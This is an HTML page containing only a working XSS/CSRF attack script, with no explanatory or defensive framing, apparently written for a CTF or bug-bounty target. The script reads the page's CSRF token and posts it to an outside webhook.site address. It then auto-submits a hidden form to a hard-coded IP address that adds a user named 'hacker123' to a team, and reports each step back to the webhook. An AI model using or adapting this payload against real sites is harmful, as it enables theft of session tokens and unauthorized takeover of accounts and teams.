<!DOCTYPE html>
<html>
<body>
  <script>
    // Send CSRF token to webhook
    function sendWebhook(status, details) {
      fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
        method: 'POST',
        mode: 'cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status, details, timestamp: new Date().toISOString() })
      })
      .catch(err => console.error('Webhook Error:', err.message));
    }

    try {
      // Try to access the dashboard's CSRF token
      const csrfToken = document.querySelector('input[name="csrfToken"]')?.value || 'not found';
      sendWebhook('xss', `CSRF token: ${csrfToken}`);
      // Optionally, submit form if token is found
      if (csrfToken !== 'not found') {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://52.47.161.102:3000/api/teams/1/addUser/hacker123';
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'csrfToken';
        input.value = csrfToken;
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
        sendWebhook('success', 'Form submitted with CSRF token');
      }
    } catch (err) {
      sendWebhook('failed', 'XSS error: ' + err.message);
    }
  </script>
</body>
</html>
